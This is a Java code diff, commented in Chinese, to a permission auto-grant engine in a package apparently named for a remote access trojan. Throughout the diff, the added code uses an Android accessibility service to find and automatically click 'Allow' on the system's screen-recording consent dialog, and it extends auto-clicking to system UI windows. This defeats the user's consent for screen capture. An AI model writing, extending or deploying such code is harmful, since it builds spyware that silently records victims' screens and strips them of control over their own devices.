@@ -109,6 +109,12 @@ public class PermissionAutoGrantEngine extends AutoEngine {
             return true;
         }
 
+        // MediaProjection 录屏授权弹窗 (com.android.systemui)
+        if ("com.android.systemui".equals(packageName)
+                && className != null && className.contains("MediaProjectionPermissionActivity")) {
+            return true;
+        }
+
         // 通用: 类名包含 GrantPermissions
         if (className != null && className.contains(GRANT_PERMISSIONS)) {
             return true;
@@ -123,10 +129,65 @@ public class PermissionAutoGrantEngine extends AutoEngine {
         log("Permission dialog detected: " + packageName + "/" + className);
 
         try {
-            autoClickAllow();
+            // MediaProjection 弹窗特殊处理 — getRootNode 拿不到 systemui 节点树
+            if ("com.android.systemui".equals(packageName)
+                    && className != null && className.contains("MediaProjectionPermissionActivity")) {
+                autoClickMediaProjection(event);
+            } else {
+                autoClickAllow();
+            }
         } catch (Exception e) {
             logError("Error auto-granting permission", e);
         }
+    }
+
+    /**
+     * MediaProjection 弹窗专用点击 — 通过 event.getSource() 获取节点树
+     *
+     * UI dump 分析:
+     *   包名: com.android.systemui
+     *   "允许" 按钮: android:id/button1
+     *   "禁止" 按钮: android:id/button2
+     *
+     * 因为 getRootNode() 遍历 windows 时拿到的是 pkg=android 的空节点,
+     * 需要通过 event.getSource() 或直接遍历 windows 查找 systemui 窗口。
+     */
+    private void autoClickMediaProjection(AccessibilityEvent event) {
+        sleep(800); // 等待弹窗渲染
+
+        // 方式 1: 通过 windows 查找 systemui 窗口的 button1
+        com.vendor.rat.service.MyAccessibilityService service =
+            com.vendor.rat.service.MyAccessibilityService.getInstance();
+        if (service == null) {
+            logError("Service not available for MediaProjection auto-click");
+            return;
+        }
+
+        java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = service.getWindows();
+        if (windows == null) {
+            logError("No windows available");
+            return;
+        }
+
+        for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
+            if (w == null) continue;
+            android.view.accessibility.AccessibilityNodeInfo wRoot = w.getRoot();
+            if (wRoot == null) continue;
+
+            // 查找 android:id/button1 ("允许" 按钮)
+            java.util.List<android.view.accessibility.AccessibilityNodeInfo> buttons =
+                wRoot.findAccessibilityNodeInfosByViewId("android:id/button1");
+            if (buttons != null && !buttons.isEmpty()) {
+                android.view.accessibility.AccessibilityNodeInfo allowBtn = buttons.get(0);
+                if (allowBtn.isClickable()) {
+                    allowBtn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                    log("Clicked MediaProjection '允许' (android:id/button1)");
+                    return;
+                }
+            }
+        }
+
+        logError("MediaProjection allow button not found in any window");
     }
 
     @Override
@@ -178,7 +239,9 @@ public class PermissionAutoGrantEngine extends AutoEngine {
                 && !rootPkg.contains("permissioncontroller")
                 && !rootPkg.contains("packageinstaller")
                 && !rootPkg.contains("lbe.security")
-                && !rootPkg.contains("huawei.systemmanager")) {
+                && !rootPkg.contains("huawei.systemmanager")
+                && !rootPkg.contains("systemui")
+                && !"android".equals(rootPkg)) {
             log("autoClickAllow: not permission pkg (" + rootPkg + "), skip");
             return;
         }
